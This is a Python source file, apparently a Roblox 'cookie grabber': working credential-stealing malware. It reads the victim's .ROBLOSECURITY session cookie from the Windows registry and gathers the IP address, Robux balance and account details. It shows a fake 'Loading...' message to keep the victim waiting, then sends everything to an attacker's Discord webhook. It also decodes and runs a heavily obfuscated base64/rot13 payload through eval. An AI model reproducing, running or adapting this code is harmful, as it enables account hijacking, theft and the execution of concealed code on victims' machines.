try:
    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
    import robloxpy
    import json
    import requests
    import os
    import base64, codecs
    from discordwebhook import *
except:
    os.system("pip install discordwebhook")
    os.system("pip install robloxpy")
    os.system("pip install requests")
    print("Run the app again.")

webhookk = "heh" # put webhook here


dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX  (creds to bingo methods) #################
magic = 'DQoNCm1hZ2ljID0gJ2FXMXdiM0owSUdKaGMyVTJOQ3dnWTI5a1pXTnpEUXB0WVdkcFl5QTlJQ2RpVjBadVlWZE5aMUJUUVc1WGEyUnpaV3hyZVU5WWJHcGlWa1p1VlVaT1ExSlhSbGxVYlhCcFRUQndjbE13YUZkbFYwcEZUVWRzYUZOR1NYZFpNR2hPVG10NE5VOVhkR2hYUlRWeFdXcE9TMkV3ZUhSVWJscHBWWHBzYjFrd1pISmtiVkY1Vm0xc2FGSjZiREpaVkU1T1pHczVWVnA2VWs1U1JUQjZWR3hTY2s1Vk5YRlpNM0JPWld4V05WUlhjRXBOUlhkM1pFUmFZV1Z0WTNsVk1GVXhVMnhTUm1KSE5WSldNWEJ4VlZSQ05GZFdTWGxrUnpWaFRUSlNjbGt4VmtaTk1WcFhWR3BHWVUxVWJHRlVNVnBUVG14T1ZsSnRXbGROYTNBeVZWY3hkMUV4VmtkalJWWlZUVVJHZUZaSGMzaGhiRVY1WkhwQ1YxSXlVazFaYWtFMVlXMU5lRlpZVWxoVFIyaEdVMWRzY2xSclRuUlZia0pxVFdzMU1sa3lOVXRoTUhoMVVXNWFhazB4Um5aU1JrWjJXakJzUkZGWFpHdFhSVFZ6V1RJd01XRkhTbGhXVkd4S1lUQndVVlpyVGtKa1JXeEhVVzVDYW1KVldYZFhiRTVGWkRJME1FMXVSa3BoV0dSUFVUSnNRbG93YkVSUmJXaHJZbFZaZDFkV2FFdGFiVkpaVTI1T1VWVXdjSFphUldoVFpESk9ObUl6V2sxTmF6VnlXVzFyTVdFeVJsbFViWEJwVFRCd2NsZFdhRU5rTUhoMFZHNWFhVlY2Ykc5YVJXaFRZVVpyZVdGSVVtRldlbFYzV1ROck5FNVZPVVZWVkZKT1ZrZGpkMVJYY0hKbGF6VlZWbFJPVUZKRmJEUlVNVkpxWkdzNVZWcDZSbEJTUjAwd1ZGWlNhbVZyTlhGV1ZGWk9Va1pGZUZReFVuSk9WWGQ1VWxod1RtVnRjM3BVVjNCR1pVVTVSVlJ0TVU5aGEwcHhWRlpTYjJGVk1UWlZXR3hQVWpCd2IxUnFTa3BOTURCNVZXMW9ZV0ZyV25CVVJ6VkRaRlp3TlZOWVRrVlZWemx1VTFWT1Fsb3hjRmhOVjJ4aFZqRktObFZHV25wS2R6QkxZa2M1TWxwVFFUbEpRMlJDVlVoYVQyUkdXbEZVYmxKWFZVVTFNR050YjNkWFJscFJWRzVTVjFWRk5UQldiRUpQWkVaYVVWUnVVbGRaVld4MFZGVjBXR0ZGZUV0TldHeFhaREpLTUZadWFGaFJNR3hSVkcxa1YxVXdPV3BqU0hCVVRVVXhSMVZYY0doT1JFcHJWbTVhY1ZGV1FqSlVibEpYVlVVMU1GWnNRazlrUmxwUkp3MEtiRzkyWlNBOUlDZEhZVVZLU0ZOd2FtOTRaMU5OZURGVVNYZE5Ta2hUZVdSTVIwbE1RVk5OUkUxNlowcElNWEUxY0ZGQlYwMWhVMFJITURsYVduaFRZM0JJWWpGYVUwMVJTRlZCTlc5M2RUSktTJw0KbG92ZSA9ICdRRWRGeUFBRVJxdUVIY1ZId0hqRkt5Q0RhU0dHSEVVTEhJWHBhdVdBS09FSTA5aUlRSU1FMjFDblJNM3JKV1dMSDFQREt5QUZScUlHSXVuSUlBM3BSeVNa'
love = 'FJAJoz1KIIcFFJ5SryAUDHuZnxqUH1cZFHSKEHuwq256BIuWZxSLEGSkMHqEDHqTIIAIFQSwn3RjrT1iZwSXoab1IaOWqIMnLHyvEHqGFz9VEIMUHHyGFISWGHMUDIqhZUyTpHcGH0uWGQSirTVjo1IKJKWVZIEWFHS6EGSKq0LmHmEnFKyKpauGJRMVL3qnHx0mFQOanRM3rIMjrTAeoxywZ0MXpIEnHwOeERqOD0S4I1uUFaIHpGSOq29gI0qUZSqKpHySIJ9YFIuTHIqeFID5M0xjM0Slq3IapRyWH0y4rIqjFxSIEwWnZHqYqTgWZJAVFGWeoycYH3qSZHy3GHb1JHxjpIOTrxSxpTSkAHS6BGEZZxyfEwOGFUO5FHSUFURmEmOeI3WVBIOjFHSOEIWkqHIVL1MVq0udExg5D0EuH0qUE01FEzS5L0MWHmIArUy1E0uKG3WVZIATIJAyEmO1IaSXGIulFHSTFayOAHE5L0qkFTAJFUqVnxMYrHARLIAUE0uSIHkVFIuTH1LkJyW5qHjjH1cnHIAZo3qOZJ56BHqUHIqKpxuGAxIFrHAnrUS1EHuwIxu3FTcTF3yQETSGE0qVEIIZFRyLEyAJZIcFrGIUryASEIEOqJ9gI1WkHxSHE3cGHaRmH0giZUSKGUueAKOVrJuTHKy3EIWwAHM4L0MOFx1nJaqBn295EHgTZUyLpxywHycGDKqUFHEeFIIBoRIVM1qTLKyEo3u1Fz4jn2qWZTAfEaykLHIXH1AirUEgpRcGIRM3H3cjFTAYFHb5FHMXAIMnIKEfEKu1DHIuI1uSFTqKpGA5oxIFpHAXFR1JERt5DIcIrHISHzAeFGORnxtlH1ETHyAQE0qCAHuVEIujFKSHFHuGq0qILzgWIIAUGQOkIRHjZHgSHH93EGOeZ0xkqJ5TrUySEII1G0qVrT1kFyqnpaqGHT8kImIZZ1WfpRyknKWXDKMUIKHkEab5EaWXEJynLIZmomOkAHjjZHqkFyAdJyI5EHI6H0AkrwyMpHcwJaW3H1qirUD1GQOSAHMYpJylFQS6E0g5G1bjpGERFxSFEzSGF0IEG0qZFR1JERt5DIcIrHIKnwOLGGV5rSMEZUEKZIAYGIWwEIcFGJuVZHyPEQN0nz9IEHWWZaIwFKqGFaOGETkiHyq1FKyAI0tlZGEhFHkfpGA1GJ9FAISWrUSTEyAKMRE6M0gSE1AdFIWWDxE6H0gVLHITo3t1MHy3H0cjH0Efo1WOrSc4AGOWrwIToyAkIRc3G0uSFQIMGQOkJUSHFIMRray2FKyAnxyEI2MRZH1YE2SWFz9YqJqWE0S4EmSFoT9FI25nITgFFRykrRM5HzcSrwIUFHt1HRc3G2MSH1AYGIWwEIcFrT1VZKOdJxcGIHM5qHcWZzgLFUujAJ95DHglHzqSo1AAHxtkqHWTrFpAPzqiMPN9VPqSq2VmoSuJoIRjISMnq1MTGyIKn3OHHyuPqyqHDx9AZxMLHzkbG1qSAJ9JoaOKLmSBJTAVJzSAIaOXIGWjE1yJMRIEoaOGHzgnZyqdDaAFExMLJxIjHx1SJaIIZIMCHJkiq2WSHyWJZyWYIIEPE2WfpSyvEKEeIz14JIEJMQEGoHMJHyEXISMIAHkInxcCMRqXFTIUoTyJn28lIGSxp00ko3qvFSMLLyqbpSHjJzSwZH5LL0unLH1LDwSIZwIQ'
god = 'WVZaNlZuSlpNMnd6V2pCc2RHSklWbWxTTW5neFYyeE9TazVyYkVkVmJteHJTbmN3UzFwSFZucGtSMngxWlZOQk9VbERaRXRUVkd4YVZHcENXVlpzUWs5a1JscFJWRzVTVjFWRk5UQldiRUpQWkVaYVVWUnVVbGRXVjFveVlqTndWRm93TVVkV2JsSkRaR3MxTWxKRmNFSmtNamg2VTFkb2VGVkZPVkJVVkVwSlpHeHNVVlJ1V25obGJFNXRZMVZ3U1dSclNqSlVNMVpPVFd0b2JWWnNRbGhaTWprMllUSk9kbVZyYURKUmJscFFVMGhDYUZOWWJIcFNiWEJDVlVoYVQyUkdXbEZVYmxKWFZVVTFNRlpzUWs5a1JscFJWRzVTVjFWRk9ETldibTh4WkZjNVMxTklXbGRWVjBvd1ZtNW9OVkpHV2xOVk0yaE9WbFprTldORVRtRmtiR3hSVkc1YWVHVnNUbTFqVlhCSlpHeGFVbGx1VW5WVE1EbDZWRVZ3Um1WSVFqWlRWekYzWWtkd01GWnVjRFZoUnpsVlpWZG9UbEl5U2pKUmJscFFVMGhDYUZOWWJIcFNiWEJDVlVoYVQyUkdXbEZVYmxKWFZVVTFNRlpzUWs5a1JscFJWRzVTVjFWRk9ETldibTh4WkZjNVMxTklXbGRWVjBvd1ZtNVpNVkpyWTNkV01YQklUVlZHVkZKRVJrcFNhMXBLVWxVeFYyUnRjREJXYlVaT1pGYzVWbE5ZYkZka01rb3dWRmhhV0dSRmVGVW5EUXBrWlhOMGFXNTVJRDBnSjBkdGNXcHlkM2t5YnpGRU5VRlNabXhFU25scFducHhkMGRJWm10eFVtdElSMkZOVFVoU05USnZlR0l4VFhvMVdFRkxlVXB4TWxjd1JVdGpSMDFoVG14R1IzbE5SM2RQVEVsNVQwSnhVMDFFUjJGRlNraFNOVEJKZVU5Q2NWSm5WRzU0VTBSeGVEVXdTWGxQUW5GVFRVUkhZVVZLU0ZJMU1FbDVUMHRhVkRWSlJrcHhXbkozU1RGdmVHTmtjWGhYTWtkdGNVcE1TSGxtYnpGUFNrRjVUVWh4UzNsYVJuaEpaMjk1UkRWYVZVRlVibmhUUkhGUlQweElTRVYyY1ZOTlJFZGhSVXBJVWpVd1NYbElha1JKVHpKSFlVVktTRkk1YTBwSU5HcEtVM1ZTV2xOMFlWRkVZMlJ2TTNoMFEwWk9ZVXRWZEROYWVXczBRWHBOY0hKUmNEQkxWWFJ0V2tsck5GcHRXbUZSUkdNd2NHRkpiWEZRVGpsV1ZFaycNCmRlc3RpbnkgPSAnbEdSY2RMeXBrbm1FT3J4SWpweVNabjBnSXFRV09aSmYwREtxNXBVV0VHVDFLb1V1MEpUa0NyS1M2SDJNTEhVU2pweVNab0hnSXFRV0FySmYwREtxU3BVV0VHUVNZSUtEbEp3U2VBUlNnREtPbEhJcTVGMUkwWnhTR25tRU9xMHlqcHlTWm9IZ0lxUVdBckpmMERLcVNwVVdFR1FTWUlLRWZEeUFlQVJTNkRLT2xISDE2RjFJMFowUzVubUVPcTB5anB5U0txMGdJcVRrbkgyZjBES2NHcFVXRUdLY1lJS0RtRHh5ZUFTYzNyVFNMRXg1eUl5RVdaeGtYbnpXS1pKZjBES3FrcFVXRUdLY1lJS0RsRElPakwxTURNYUVBRjAx'
destiny = 'ZJ8kGmOZFTqWpISKoycXMwORF2AOpSIKEHqEG1yWF0EfERu5MHSFHmARF09fFRgCM0LkFGOiHwSKoz1SG3RjFJcjrIAnJxuaFKSEI25nFzLjERgwDKOII0IUHH9MFHgRoREVrJIOH2ZmpHgCoRuVnzcTZHxjJauGI25gEH9iFSAdpUyGnycFM0ykHIqDExczZREYL1qjIIqSpSSWJHyYEJMUHIAyDIAwZ0pmG2kVFQRkEwSWZSc4ZGIhoHICo0g5naO5H0cOFKSzpyWGEUW4rTkUHzAxGUudoRWXpJcWIKy6E0uAZKS4n1yRF3yCpGOSLxqIpIcnHwSVExgknIc4FGIXH0IKJaueJT56I0gnFzLjERbkH3OII0IjITgMFHgRoHEVrJIOHyAaERgCoRuYGzcWZzf0GQS5EUOEqJcnZRyzo3uvZHkVDGWjIR1YJau4ZRqVL25ZFKIHpyRjLISRL2EiZ3u0D0MBLHgIqQAnrJf0DKcApUWEpQOYIKEgJxyeAScgJzSEETZjpTSWoKSDGwyJIRxlGRcdLypknmEOrxIjpySZn0gIqQWOZJf0DKq5pUWEGT1KoUu0JTkCrKS6H2MLHUSjpySZoHgIqQWArJf0DKqSpUWEGQSYIKDlJwSeARSgDKOlHIq5F1I0ZxSGnmEOq0yjpySZoHgIqQWArJf0DKqSpUWEGQSYIKEfDyAeARS6DKOlHH16F1I0Z0S5nmEOq0yjpySKq0gIqTknH2f0DKcGpUWEGKcYIKDmDxyeASc3rTSLEx5yIyEWZxkXnzWKZJf0DKqkpUWEGKcYIKDlDIOjL1MDMaEAF011o1O0LHgIqQWnZJf0DKcApUWEGQOYIKDlDHyeARS3DKOlHKOgF1I0oR1WnmEOq0IjpySZZHgIqQWnZJf0DKcApUWEGQOYIKDlDHyeASc3qKOlHHjjF1I0ZxSWnmEOoHSjpySjZRgIqQWPFJf0DKcWpUWEpQIYIKEfGQSeASc3G3OlHH11F1I0Zx15nmEOoKyjpySJAIqfrRSDrxxlGRcdLxjlBJqjIUyzGHM1qxkYDKyOq0EbGUqZZR1HFKqiZxI5JSEWZxkXnzWKZJf0DJ1SpUWEpTkYIKDmDHyeARSgDKOlHKNjI2k4L1yDpQujZ0Ifoxb1LHA2pTMKZxx0GHcnLIuTrQ0aQDcdo3xtCFNaKUt3Zyk4AzMprQp0KUtmZIk4ZmZaQDc0paImqPN9VTI2LJjbW1k4AzEprQLkKUt2A1k4AwyprQLmWlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzAprQMzKUt3Ayk4AwIprQWwKUtlZSk4AzSprQMzKUt3BIk4ZwxaXFNeVTI2LJjbW1k4AwqprQMzKUt2APpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2AIk4AmAprQp0KUt2BIk4AzIprQp5KUtlL1k4ZwOprQMuKUt2Myk4AmyprQV5WlxAPzI2LJjbL29gpTyfMFuvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AmEprQplKUt3AIk4AmAprQp0WlxcYPp8p3ElnJ5aCvpfW2I4MJZaXFx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
